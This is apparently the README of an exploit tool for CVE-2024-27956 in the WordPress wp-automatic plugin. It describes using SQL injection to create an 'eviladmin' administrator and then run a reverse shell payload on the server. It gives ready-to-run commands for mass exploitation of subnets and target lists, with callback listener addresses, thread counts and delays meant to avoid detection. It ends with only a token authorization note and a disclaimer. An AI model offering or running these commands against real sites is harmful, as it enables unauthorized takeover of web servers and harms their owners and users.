## WordPress Admin Account Creation and Reverse Shell (cve-2024-27956)

This Python script automates the process of creating a new administrator account in a WordPress site and executing a reverse shell on the target server. It utilizes the wp-automatic plugin's CSV injection vulnerability to execute SQL queries on the WordPress database and gain administrative access.
 
  
## update 🦹‍♀️
 
### Nuclei template added
### add some more methods for supporting massive attack targets 
### add multiple targets support
### add Auto find target by scanners base ip or txt file 

## How to use 

- Here are some more advanced examples of how you might use the script, assuming you have the proper authorization to test the target systems.

1. **Scanning a subnet**: If you want to scan a subnet for vulnerable WordPress installations, you can use the `--subnet` option. For example:
   ```
   python wp-automatic-exploit.py --subnet 192.168.1.0/24 --lhost 127.0.0.1 --lport 1414 --threads 10 --delay 1.0
   ```
   This command will scan the `192.168.1.0/24` subnet for WordPress sites with the vulnerable WP Automatic plugin, and attempt to exploit them using the provided listener settings.

2. **Customizing the delay**: The delay between requests can be adjusted using the `--delay` option. A higher delay may help avoid detection or rate limiting, while a lower delay can speed up the exploitation process. For example:
   ```
   python wp-automatic-exploit.py --targets targets.txt --lhost 127.0.0.1 --lport 1414 --threads 10 --delay 2.5
   ```
   This command will use a delay of 2.5 seconds between requests.

3. **Using a remote listener**: If your listener is set up on a remote machine, you can specify its IP address and port using the `--lhost` and `--lport` options. For example:
   ```
   python wp-automatic-exploit.py --targets targets.txt --lhost 192.168.1.100 --lport 8080 --threads 10 --delay 1.0
   ```
   This command will connect back to a listener on `192.168.1.100:8080`.

4. **Increasing the number of threads**: You can increase the number of threads used by the script with the `--threads` option. This can speed up the exploitation process, but may also increase the likelihood of detection or cause issues with rate limiting. For example:
   ```
   python wp-automatic-exploit.py --targets targets.txt --lhost 127.0.0.1 --lport 1414 --threads 20 --delay 1.0
   ```
   This command will use 20 threads for exploitation.


## Prerequisites

- Python 3.x
- `requests` library (install via `pip install requests`)
- Netcat (for setting up a listener to connect to the reverse shell)

## Usage

1. Replace the `domain` variable in the script with the URL of the target WordPress site.
2. Run the Python script.
3. Once the script is executed, it will create a new admin user named `eviladmin`, set the password, and assign administrative privileges.
4. It will then upload and execute a reverse shell payload on the target server.
5. Set up a netcat listener to connect to the reverse shell using the specified port.

**Note:** Ensure that you have proper authorization and permissions before running this script, as it can lead to security vulnerabilities and legal consequences if misused.

## Disclaimer

This script is provided for educational and testing purposes only. The author assumes no liability for any unauthorized or illegal use of this script. Use it at your own risk.
